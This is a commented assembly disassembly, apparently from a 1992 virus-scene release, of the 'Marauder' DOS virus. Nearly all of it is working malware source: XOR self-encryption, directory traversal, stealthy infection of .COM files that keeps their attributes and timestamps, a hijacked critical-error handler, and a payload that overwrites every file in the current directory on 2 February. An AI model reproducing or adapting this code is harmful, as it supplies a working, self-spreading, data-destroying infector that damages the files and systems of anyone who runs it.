;---
;
; Marauder Virus
;
; Aliases: Deadpool-B, 808-B, 860
;
; Disassembled By Admiral Bailey [YAM '92]
; June 25, 1992
;
; The writer of this virus was Hellraiser of Phalcon/Skism.
;
; Notes:Marauder is a encrypting, semi-mutating, .COM file infector.
;       The virus will look for a .COM file and if none are found it
;       will go down (or up or whatever you want) the directory tree
;       until it hits the root.  It adds 860 bytes to an infected .
;       COM.  It can infect any .COM file with any attribute on it, the
;       files date and time will stay the same also.  If run on a write
;       protected disk a system error will NOT occur, it will just
;       terminate infection.  The . COM files have to be between 16 and
;       64675 bytes in order to be infected. The virus ins ramdomly
;       encrypted.
;       If run on Feb. 2nd of any year the virus will overwrite all the
;       files in the current directory with the messege "=  [Marauder]
;       1992 Hellraiser - Phalcon/Skism", and the files will be
;       destroyed. For more information check out Vsum and see what it
;       says.
;
;---------
PAGE  59,132

psp_cmd_size    equ     80h
data_20e        equ     484h
data_22e        equ     487h
data_23e        equ     4D3h
data_24e        equ     4D4h
data_25e        equ     4D6h
data_27e        equ     4139h
data_29e        equ     100h

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
                org     100h

marauder        proc    far
start:
                jmp     loc_1
                db       88h, 00h, 00h, 00h, 00h, 00h   ; old .COM file
                db       00h, 00h,0B8h, 00h, 4Ch,0CDh
                db      21h
loc_1:
                call    main_program
marauder        endp

;---
;  This subroutine is what calls the encryption then runs the virus.
;--------
main_program    proc    near
                pop     si                      ; pop ip into si
                sub     si,10Eh                 ; calculate the offset
                call    encrypt_decrypt         ; dencrypt the virus
                jmp     set_int_vec             ; run the virus
                db       41h, 39h
;---
;  This is where the Encryption Routine Is...
;--------
encrypt_decrypt:
                mov     bp,si                   ; save si into bp
                add     si,465h                 ; calc. the end of enc.
                mov     di,si                   ; put it into di
                push    ax                      ; save these
                push    bx                      ;
                push    cx                      ;
                push    dx                      ;
                mov     cx,18Fh                 ; size of virus
                std
xor_loop:
                lodsw                           ; get a word into ax
                xor     ax,[bp+119h]            ; xor
                stosw                           ; put it back
                loop    xor_loop                ; loop
                pop     dx                      ; restore these
                pop     cx                      ;
                pop     bx                      ;
                pop     ax                      ;
                mov     si,bp                   ;
                retn

;---
;  Infection to files is done here.
;---------
infect:
                call    encrypt_decrypt         ; first encrypt file
                int     21h                     ; write it to the file
                call    encrypt_decrypt         ; now unencrypt
                retn
                db       6Bh, 10h, 6Ah, 11h, 80h,0CEh ; encrypted msg
                db       38h,0CAh,0D7h,0C0h,0FFh, 02h
               db       38h,0CAh,0C7h,0BDh,0B2h,0B4h
               db       61h, 1Ah, 60h, 1Bh,0B2h,0AFh
               db      0B8h, 87h, 5Ch, 45h,0B2h,0BFh
               db       69h, 12h, 68h, 13h, 80h,0CEh
               db       38h,0BCh, 63h, 18h, 62h, 19h
               db      0B2h,0B4h,0F4h, 61h, 19h, 1Ah
               db      't K L%\3da', 8, 'x'
               db       00h, 73h, 19h
               db      9, '\-U3X(J$'
               db      'Ka'
               db      14h
               db      'ai)X-Z.Wnj*P2To '
set_int_vec:
               push    es
               mov     ax,3524h                ; This will get the dos
               int     21h                     ; critical error hndlr.
                                                ; save and replace it
               mov     word ptr ds:[45Eh][si],bx ;
               mov     word ptr ds:[460h][si],es ;
               pop     es                      ;
               mov     ax,2524h
               lea     dx,[si+462h]            ; the new int 24
               int     21h                     ; set int vector
               push    si                      ; get the current
               mov     ah,47h                  ; directory and drive
               xor     dl,dl                   ; number
               add     si,data_25e
               int     21h
               pop     si                      ; get the default drive
               mov     ah,19h
               int     21h
               add     al,41h
               mov     ds:data_23e[si],al
               mov     ax,5C3Ah
               mov     ds:data_24e[si],ax
               push    si
               pop     bp
               lea     si,[bp+44Fh]            ; Load effective addr
               lea     di,[bp+453h]            ; Load effective addr
               mov     cx,4
               cld                             ; Clear direction
               rep     movsb                   ;
               push    bp
               pop     si
check_date:
               mov     ah,1Ah                  ; set DTA
               lea     dx,[si+46Fh]
               int     21h
               mov     ah,2Ah                  ; Get the current date
               int     21h
               cmp     dx,202h                 ; Is it Feb 2nd
               jne     find_first_file         ; nope then get a file
               jmp     kill_all_files          ; yup, kill all files
find_first_file:
               mov     ah,4Eh                  ; Find next file
               lea     dx,[si+438h]            ; placement of *.com
               mov     cx,7                    ; all attributes
find_file:
               int     21h                     ; find file command
               jnc     put_new_attribs         ; if found infect it
               mov     ah,1Ah                  ; none found, set DTA
               lea     dx,[si+518h]
               int     21h
               mov     ah,3Bh                  ; change directories
               lea     dx,[si+442h]            ; directory to go to
               int     21h
               jc      find_first_file_2       ; if error then jump
               jmp     short check_date ;loc_4 ; else check the date
find_first_file_2:
               cmp     byte ptr data_16[si],1
               je      find_next_file
               mov     al,1
               mov     data_16[si],al
               mov     ah,4Eh                  ; find first file
               xor     cx,cx                   ; all attribs
               mov     cl,13h
               lea     dx,[si+43Eh]            ; type to find
find_file_2:
               int     21h                     ; find file
               jnc     set_directory           ; found then get
               jmp     set_directory_2         ; none found
               db       90h, 90h               ; 2 nop's
find_next_file:
               mov     ah,4Fh                  ; find next file
               jmp     short find_file_2
set_directory:
               mov     ah,3Bh                  ; set current directory
               lea     dx,[si+536h]
               int     21h
               jc      find_next_file          ; if error jump
               jmp     short check_date ;loc_4 ; else check date
put_new_attribs:
               mov     bx,ds:data_20e[si]
               mov     data_7[si],bx
               mov     ax,4301h                ; here we set the files
               xor     cx,cx                   ; attribs to normal
               lea     dx,[si+48Dh]            ; filename
               int     21h
               jc      error_code              ; if error jump
               call    open_file
               jc      error_code              ; if error jump
               mov     word ptr data_7+1[si],ax
               mov     bx,ds:data_22e[si]
               mov     data_5[si],bx
               mov     bx,word ptr ds:data_20e+1[si]
               mov     data_6[si],bx
               xchg    ax,bx
               mov     ah,3Fh                  ; read in first 4 bytes
               mov     cx,4                    ;
               lea     dx,[si+44Fh]
               int     21h                     ;
               cmp     byte ptr data_10[si],88h
               jne     check_out_file          ; Jump if not equal
set_attribs:
               mov     ax,4301h                ; set the attribs
               mov     cx,data_7[si]           ; back to original
               lea     dx,[si+48Dh]            ; before
               xor     ch,ch
               int     21h
               mov     ah,3Eh                  ; close up the file now
               int     21h
error_code:
               cmp     ax,5                    ; checking error code
               je      is_error
               cmp     ax,2
               je      is_error                ; find next file
               mov     ah,4Fh
               jmp     find_file
is_error:
               jmp     set_directory_2
check_out_file:
               cmp     data_9[si],5A4Dh
               je      set_attribs             ; Jump if equal
               call    move_file_ptr_2
               cmp     ax,10h                  ; comparing file size
               jb      set_attribs             ; Jump if below
               cmp     ax,0FC9Fh
               jae     set_attribs             ; Jump if above or =
               sub     ax,3
               mov     data_13[si],ah
               mov     data_12[si],al
               mov     byte ptr data_14[si],88h
               nop
               mov     ah,0E9h
               mov     data_11[si],ah
               xor     al,al
               mov   data_16[si],al
               inc     data_4[si]
               mov     bp,si
               call    decrypt_messege
random_encrypt:
               mov     ah,2Ch                  ; get the time
               int     21h
               cmp     dx,0                    ; if 0 get another
               je      random_encrypt
               mov     word ptr ds:[119h][si],dx ; save number
               mov     cl,8
               ror     dx,cl                   ; Rotate
               mov     data_15[si],dx
               cmp     dl,1Eh
               jle     loc_17                  ; Jump if < or =
               jmp     short loc_18
               db      90h
loc_17:
               lea     si,[bp+143h]            ; Load effective addr
               lea     di,[bp+11Bh]            ; Load effective addr
               mov     cx,10h
               call    sub_4
               lea     si,[bp+153h]            ; Load effective addr
               lea     di,[bp+133h]            ; Load effective addr
               mov     cx,6
               call    sub_4
               jmp     short get_file
               db      90h
loc_18:
               lea     si,[bp+159h]            ; Load effective addr
               lea     di,[bp+11Bh]            ; Load effective addr
               mov     cx,10h
               call    sub_4
               lea     si,[bp+169h]            ; Load effective addr
               lea     di,[bp+133h]            ; Load effective addr
               mov     cx,6
               call    sub_4
get_file:
               call    decrypt_messege
               mov     si,bp
               mov     ah,40h
               mov     cx,357h
               add     cx,5
               lea     dx,[si+10Bh]            ; Load effective addr
               call    infect                  ; infect the file now
               jc      finished_with_file      ; if an error
               call    move_file_ptr_1
               mov     ah,40h                  ; now we write back the
               mov     cx,4                    ; 4 bytes
               lea     dx,[si+457h]
               int     21h
finished_with_file:
               mov     ax,5701h                ; set old date+time
               mov     cx,data_6[si]
               mov     dx,data_5[si]
               mov     bx,word ptr data_7+1[si]
               int     21h
               mov     ah,3Eh                  ; close up the file
               int     21h
               mov     ax,4301h                ; set back old attribs
               mov     cx,data_7[si]
               lea     dx,[si+48Dh]
               xor     ch,ch
               int     21h
set_directory_2:
               mov     ah,3Bh                  ; set the directory a
               lea     dx,[si+4D3h]
               int     21h
almost_done:
               mov     ah,1Ah                  ; set DTA
               mov     dx,psp_cmd_size
               int     21h
               push    si
               pop     bp
               mov     ax,2524h                ; set int vector 24
               lea     dx,[si+45Eh]
               int     21h
               lea     si,[bp+453h]
               mov     di,data_29e
               mov     cx,4
               cld
               rep     movsb
               mov     di,offset start
               jmp     di                      ; Jump to main program
kill_all_files:
               call    decrypt_messege
               mov     ah,4Eh                  ; find first file
               mov     cx,7
               lea     dx,[si+43Eh]
find_file_loop:
               int     21h                     ; find file
               jc      almost_done
               call    write_file
               mov     ah,4Fh                  ; find next file
               jmp     short find_file_loop
main_program   endp

;---
;  Just A regular subroutine
;---------
sub_4          proc    near
               cld
               rep     movsb
               retn
sub_4          endp

;---
; This subroutine decrypts the messege that gets written to files when
; the date is Feb. 2nd.
;---------
decrypt_messege proc    near
               mov     si,bp
               add     si,143h
               mov     di,si
               mov     cx,2Dh
locloop_25:
               lodsw
               xor     ax,[bp+45Bh]
               stosw
               loop    locloop_25
               mov     si,bp
               retn
decrypt_messege endp

;---
;  Move the file pointer to beginning of file
;--------
move_file_ptr_1 proc   near
               mov     ax,4200h                ; move the file pointer
               xor     cx,cx
               xor     dx,dx
               int     21h
               retn
move_file_ptr_1 endp

;---
;  Moves the file pointer to the end of the file
;---------
move_file_ptr_2 proc    near
               mov     ax,4202h                ; move file pointer to
               xor     dx,dx                   ; end
               xor     cx,cx
               int     21h
               retn
Move_file_ptr_2 endp

;---
;  This little sub routine opens the file...
;----------
open_file      proc    near
               mov     ax,3D02h                ; open the file
               lea     dx,[si+48Dh]
               int     21h
               retn
open_file      endp

;---
;  This sub writes the messege to the files when the date is Feb 2nd.
;---------
write_file      proc    near
               call    open_file               ; open the file
               jc      time_to_return          ; if error jump
               mov     bx,ax
               push    bx
               call    move_file_ptr_2         ; move to end of file
               mov     bx,2Fh
               div     bx                      ; ax,dx rem=dx:ax/reg
               mov     cx,ax
               pop     bx
               push    cx
               call    move_file_ptr_1         ; move to beginning of
               pop     cx                      ; file
write_it:
               push    cx
               mov     ah,40h                  ; write the messege to
               mov     cx,2Fh                  ; file
               lea     dx,[si+16Fh]
               int     21h
               jc      close_up                ; if error jump
               pop     cx                      ;                   ||
               dec     cx                      ; new command to me \/
               jcxz    close_up                ; Jump if cx=    <--|
               jmp     short write_it
close_up:
               mov     ah,3Eh                  ; close up the file
               int     21h
time_to_return:
               retn
write_file     endp

               db       2Ah, 2Eh, 43h, 4Fh, 4Dh, 00h ; '*.COM',0
               db       2Ah, 2Eh               ; '*.*'
data_4         dw      2Ah                     ; ---^
data_5         dw      2E2Eh                   ; These things hold
data_6         dw      200h                    ; stuff like old date,
data_7         dw      0D900h                  ; first 4 bytes ect...
               db      18h,0FDh
data_9         dw      2002h
               db      5
data_10        db      0
               db       00h,0EBh, 09h, 90h
data_11        db      0
data_12        db      0EBh
data_13        db      59h
data_14        db      90h
data_15        dw      0E954h
data_16        db      0Dh

;---
;  Used in setting the int 24
;---------
int_24h_ent_1   proc    far
               add     ds:data_27e[bx+si],cl
int_24h_ent_1    endp

;---
;  Used for setting the int 24.
;---------
int_24h_entry  proc    far
               add     [bp+5],dl
               db       63h, 14h, 32h,0C0h,0CFh, 8Eh
               db       06h
int_24h_entry  endp

seg_a          ends

               end     start


